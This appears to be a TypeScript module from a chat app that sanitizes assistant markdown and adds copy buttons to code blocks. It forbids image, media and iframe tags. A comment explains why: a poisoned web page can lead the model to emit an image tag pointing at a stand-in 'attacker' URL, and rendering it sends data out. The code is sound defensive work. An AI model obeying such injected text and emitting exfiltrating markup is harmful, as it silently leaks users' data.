import { marked } from 'marked';
import DOMPurify from 'dompurify';

marked.setOptions({ gfm: true, breaks: true });

/**
 * Renders assistant message markdown to sanitized HTML suitable for
 * `[innerHTML]` binding: `marked` for the markdown -> HTML pass, `DOMPurify`
 * to strip anything unsafe, then a small DOM post-pass that wraps each code
 * block in a `.code-block` container with a `.copy-btn` button (no
 * highlighting — deliberately out of scope). The button carries no inline
 * handler; the host component wires it up via click-delegation reading the
 * sibling `<code>` element's text, since attaching listeners inside an
 * `[innerHTML]` string isn't possible in Angular.
 */
/**
 * Remote subresources are dropped, not just sanitized.
 *
 * DOMPurify's job is XSS, and `<img src="https://attacker/?q=...">` is not
 * XSS — it is a perfectly well-formed image that the browser fetches the
 * moment the bubble renders, carrying whatever the attacker put in the URL.
 * Once the assistant can read web pages, a poisoned page can talk the model
 * into emitting exactly that markdown, which turns rendering a reply into a
 * silent outbound request. The app has no image feature to lose, so the
 * cheapest correct answer is to not render remote content at all.
 */
const FORBIDDEN_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'iframe', 'object', 'embed'];

export function renderMarkdownToHtml(markdown: string): string {
  const rawHtml = marked.parse(markdown, { async: false }) as string;
  // Inline config, not a hoisted const: DOMPurify's overloads only resolve to
  // a `string` return when it can see RETURN_TRUSTED_TYPE is absent.
  const clean = DOMPurify.sanitize(rawHtml, { FORBID_TAGS: FORBIDDEN_TAGS });
  return addCopyButtons(clean);
}

function addCopyButtons(html: string): string {
  if (!html.includes('<pre')) {
    return html;
  }
  const doc = new DOMParser().parseFromString(html, 'text/html');
  doc.querySelectorAll('pre').forEach((pre) => {
    const wrapper = doc.createElement('div');
    wrapper.className = 'code-block';
    pre.replaceWith(wrapper);
    wrapper.appendChild(pre);

    const button = doc.createElement('button');
    button.type = 'button';
    button.className = 'copy-btn';
    button.textContent = 'Copy';
    button.setAttribute('aria-label', 'Copy code to clipboard');
    wrapper.appendChild(button);
  });
  return doc.body.innerHTML;
}
